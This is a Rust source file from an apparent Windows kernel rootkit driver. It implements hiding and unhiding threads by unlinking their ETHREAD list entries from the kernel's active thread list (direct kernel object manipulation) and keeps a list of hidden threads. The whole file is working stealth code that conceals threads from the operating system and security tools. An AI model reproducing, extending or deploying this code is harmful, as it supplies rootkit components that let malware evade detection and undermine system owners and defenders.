use alloc::vec::Vec;
use wdk_sys::{ntddk::*, *};
use spin::{mutex::Mutex, lazy::Lazy};
use crate::{
    error::ShadowError,
    lock::with_push_lock_exclusive, 
    offsets::{
        get_thread_list_entry_offset, 
        get_thread_lock_offset
    }
};
use common::{structs::TargetThread, vars::MAX_TID};

pub mod callback;
pub use callback::*;

/// List of target threads protected by a mutex.
pub static THREAD_INFO_HIDE: Lazy<Mutex<Vec<TargetThread>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_TID))); 

/// Represents a thread in the operating system.
///
/// The `Thread` struct provides a safe abstraction over the `ETHREAD` structure used
/// in Windows kernel development. It allows for looking up a thread by its TID and ensures
/// proper cleanup of resources when the structure goes out of scope.
pub struct Thread {
    /// Pointer to the ETHREAD structure, used for managing thread information.
    pub e_thread: PETHREAD,
}

impl Thread {
    /// Creates a new `Thread` instance by looking up a thread by its TID.
    ///
    /// This method attempts to find a thread using its thread identifier (TID). If the thread
    /// is found, it returns an instance of the `Thread` structure containing a pointer to the 
    /// `ETHREAD` structure.
    ///
    /// # Arguments
    /// 
    /// * `tid` - The thread identifier (TID) of the thread to be looked up.
    ///
    /// # Returns
    /// 
    /// * `Ok(Self)` - Returns a `Thread` instance if the thread lookup is successful.
    /// * `Err(ShadowError)` - Returns an error message if the lookup fails.
    ///
    /// # Examples
    ///
    /// ```rust
    /// let thread = Thread::new(1234);
    /// match thread {
    ///     Ok(thre) => println!("Thread found: {:?}", thre.e_thread),
    ///     Err(e) => println!("Error: {}", e),
    /// }
    /// ```
    #[inline]
    pub fn new(tid: usize) -> Result<Self, ShadowError> {
        let mut thread = core::ptr::null_mut();

        let status = unsafe { PsLookupThreadByThreadId(tid as _, &mut thread) };
        if NT_SUCCESS(status) {
            Ok(Self { e_thread: thread })
        } else {
            Err(ShadowError::ApiCallFailed("PsLookupThreadByThreadId", status))
        }
    }
}

/// Implements the `Drop` trait for the `Thread` structure to handle cleanup when the structure goes out of scope.
///
/// The `Drop` implementation ensures that the reference count on the `ETHREAD` structure
/// is properly decremented when the `Thread` instance is dropped. This prevents resource leaks.
impl Drop for Thread {
    /// Cleans up the resources held by the `Thread` structure.
    ///
    /// This method decrements the reference count of the `ETHREAD` structure when the
    /// `Thread` instance is dropped, ensuring proper cleanup.
    fn drop(&mut self) {
        if !self.e_thread.is_null() {
            unsafe { ObfDereferenceObject(self.e_thread as _) };
        }
    }
}

impl Thread {
    /// Hides a thread by removing it from the active thread list in the operating system.
    ///
    /// This method hides a thread by unlinking it from the active thread list (`LIST_ENTRY`) in the OS.
    /// It uses synchronization locks to ensure thread safety while modifying the list. Once the thread is hidden,
    /// it is no longer visible in the system's active thread chain.
    ///
    /// # Arguments
    ///
    /// * `tid` - The thread identifier (TID) of the target thread to be hidden.
    ///
    /// # Returns
    ///
    /// * `Ok(LIST_ENTRY)` - Returns the previous `LIST_ENTRY` containing the pointers to the neighboring threads
    ///   in the list before it was modified.
    /// * `Err(ShadowError)` - Returns an error if the thread lookup fails or the operation encounters an issue.
    pub unsafe fn hide_thread(tid: usize) -> Result<LIST_ENTRY, ShadowError> {
        // Getting offsets based on the Windows build number
        let active_thread_link = get_thread_list_entry_offset();
        let offset_lock = get_thread_lock_offset();

        // Retrieving ETHREAD from the target thread
        let thread = Self::new(tid)?; 

        // Retrieve the `LIST_ENTRY` for the active thread link, which connects the thread
        // to the list of active threads in the system.
        let current = thread.e_thread.cast::<u8>().offset(active_thread_link) as PLIST_ENTRY;
        let push_lock = thread.e_thread.cast::<u8>().offset(offset_lock) as *mut u64;

        // Use synchronization to ensure thread safety while modifying the list
        with_push_lock_exclusive(push_lock, || {
            // The next thread in the chain
            let next = (*current).Flink;

            // The previous thread in the chain
            let previous = (*current).Blink;
            
            // Storing the previous list entry, which will be returned
            let previous_link = LIST_ENTRY {
                Flink: next as *mut LIST_ENTRY,
                Blink: previous as *mut LIST_ENTRY,
            };

            // Unlink the thread from the active list
            (*next).Blink = previous;
            (*previous).Flink = next;

            // Make the current list entry point to itself to hide the thread
            (*current).Flink = current;
            (*current).Blink = current;

            Ok(previous_link)
        })
    }

    /// Unhides a thread by restoring it to the active thread list in the operating system.
    ///
    /// This method restores a previously hidden thread back into the active thread list by re-linking
    /// its `LIST_ENTRY` pointers (`Flink` and `Blink`) to the adjacent threads in the list. The function
    /// uses synchronization locks to ensure thread safety while modifying the list.
    ///
    /// # Arguments
    ///
    /// * `tid` - The thread identifier (TID) of the target thread to be unhidden.
    /// * `list_entry` - A pointer to the previous `LIST_ENTRY`, containing the neighboring threads in the list,
    ///   which was saved when the thread was hidden.
    ///
    /// # Returns
    ///
    /// * `Ok(NTSTATUS)` - Indicates the thread was successfully restored to the active list.
    /// * `Err(ShadowError)` - Returns an error if the thread lookup fails or the operation encounters an issue.
    pub unsafe fn unhide_thread(tid: usize, list_entry: PLIST_ENTRY) -> Result<NTSTATUS, ShadowError> {
        // Getting offsets based on the Windows build number
        let active_thread_link = get_thread_list_entry_offset();
        let offset_lock = get_thread_lock_offset();

        // Retrieving ETHREAD from the target thread
        let thread = Self::new(tid)?; 

        // Retrieve the `LIST_ENTRY` for the active thread link, which connects the thread
        // to the list of active threads in the system.
        let current = thread.e_thread.cast::<u8>().offset(active_thread_link) as PLIST_ENTRY;
        let push_lock = thread.e_thread.cast::<u8>().offset(offset_lock) as *mut u64;

        // Use synchronization to ensure thread safety while modifying the list
        with_push_lock_exclusive(push_lock, || {
            // Restore the `Flink` and `Blink` from the saved `list_entry`
            (*current).Flink = (*list_entry).Flink as *mut _LIST_ENTRY;
            (*current).Blink = (*list_entry).Blink as *mut _LIST_ENTRY;

            // Re-link the process to the neighboring processes in the chain
            let next = (*current).Flink;
            let previous = (*current).Blink;

            (*next).Blink = current;
            (*previous).Flink = current;
        });

        Ok(STATUS_SUCCESS)
    }

    /// Enumerates all currently hidden threads.
    ///
    /// This function iterates through the list of hidden threads stored in `THREAD_INFO_HIDE` and returns
    /// a vector containing their information.
    ///
    /// # Returns
    ///
    /// * A vector containing the information of all hidden threads.
    pub unsafe fn enumerate_hide_threads() -> Vec<TargetThread> {
        let mut threads: Vec<TargetThread> = Vec::new();
        let thread_info = THREAD_INFO_HIDE.lock();
        for i in thread_info.iter() {
            threads.push(TargetThread {
                tid: (*i).tid as usize,
                ..Default::default()
            });
        }

        threads
    }

}